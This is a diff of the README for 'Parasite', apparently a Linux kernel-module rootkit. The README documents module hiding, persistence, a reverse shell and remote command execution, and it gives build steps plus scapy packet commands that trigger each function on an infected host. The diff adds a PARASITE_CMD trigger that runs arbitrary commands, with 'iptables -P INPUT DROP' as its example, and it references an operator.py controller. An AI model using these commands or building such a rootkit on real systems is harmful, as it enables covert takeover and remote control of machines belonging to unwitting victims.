@@ -1,5 +1,5 @@
 # Parasite
-This is a rootkit written in the form of a Linux kernel module (LKM), which currently contains module hiding, RCE/reverse shell, and persistence functionalities
+This is a rootkit written in the form of a Linux kernel module (LKM), which currently contains module hiding, RCE, reverse shell, and persistence functionalities
 
 ## Installation
 NOTE - Read the disclaimer if you haven't already. Additionally, it is *highly recommended* that you use this in a VM!
@@ -18,7 +18,7 @@ apt update && apt install linux-headers-$(uname -r) -y
 git clone https://github.com/MurryPuppins/Parasite.git
 ```
 
-3. Enter directory and build the kernel module (requires Make)
+3. Enter directory and build the kernel module (requires make and kernel build module)
 ```
 cd Parasite
 
@@ -45,7 +45,7 @@ lsmod | grep Parasite
 
 ### RCE/Rootkit Usage
 
-By default, Parasite listens for TCP packets on port 6969. The rootkit has 3 options that can be used: hide, show, and reverse shell. It doesn't matter how you send the packet, but personally I used scapy. 
+By default, Parasite listens for TCP packets on port 6969. The rootkit has 4 options that can be used: hide, show, reverse shell, and command execution. It doesn't matter how you send the packet, but personally I used scapy (see *operator.py* for automated functionality).
 
 Note: You *must* replace **INSERT_IP** with the rootkit-infected machine's IP
 
@@ -64,6 +64,11 @@ sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_SHOW'))
 - PARASITE_RSHELL127.0.0.1 - This spawns a reverse shell using your IP (change 127.0.0.1 to your IP). You will need to be listening for port 5555 (default) on your machine to catch the shell
 ```
 sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_RSHELL127.0.0.1))
+```
+
+- PARASITE_CMD - Executes the command following directly after the **_CMD** (e.g., PARASITE_CMDiptables -P INPUT DROP). Results/output of cmd execution are not returned. 
+```
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_CMD<put_cmd_here_without_brackets>))
 ```
 
 ### operator.py script
